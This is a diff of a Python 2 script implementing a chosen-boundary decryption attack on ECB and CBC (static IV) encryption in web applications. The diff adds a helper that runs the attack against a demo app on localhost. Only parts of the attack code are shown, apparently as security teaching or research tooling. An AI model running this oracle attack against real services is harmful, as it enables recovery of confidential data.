@@ -1,10 +1,14 @@
 #!/usr/bin/python
 '''
 Implements the Chosen Boundary attack for a web application.
+Run cbExample to see an example of this attack on the demo web app
 '''
 import urllib2
 import binascii
 import sys
+
+def cbExample():
+    cbAttack('http://127.0.0.1:8000/encrypt?mode=CBC&pre=testtessadfadssdffffttesdfssstsadsadf&post=abcdefghijklmnopqrstuvwxyz12345','data','querystring','CBC')
 
 def updateRequest(url,ptParam,ptData,encDataLocation,headers={},data=None):
     if(encDataLocation == 'headers'):
@@ -18,11 +22,15 @@ def updateRequest(url,ptParam,ptData,encDataLocation,headers={},data=None):
     req = urllib2.Request(url,data,headers)
     return req
 
+'''
+Implements the chosen boundary attack on both ECB and CBC (w/ static IV) mode block ciphers
+This attack can decrypt data that is appended to user entered data.
+'''
 def cbAttack(url,ptParam,encDataLocation,mode,headers={},data=None):
     firstChar = 48
     lastChar = 125
     charRange = range(firstChar,lastChar)
-    #Remove the ; ccharacter
+    #Remove the ; character
     charRange.remove(48+11)
     #just a backspace so we can get cool live printouts
     bs = '\b' * 1000 
@@ -109,5 +117,3 @@ def cbAttack(url,ptParam,encDataLocation,mode,headers={},data=None):
         
 def replaceChar(str,index,newChar):
     return str[:index-1]+newChar+str[index:]
-
-cbAttack('http://127.0.0.1:8000/encrypt?mode=CBC&pre=testtessadfadssdffffttesdfssstsadsadf&post=abcdefghijklmnopqrstuvwxyz12345','data','querystring','CBC')
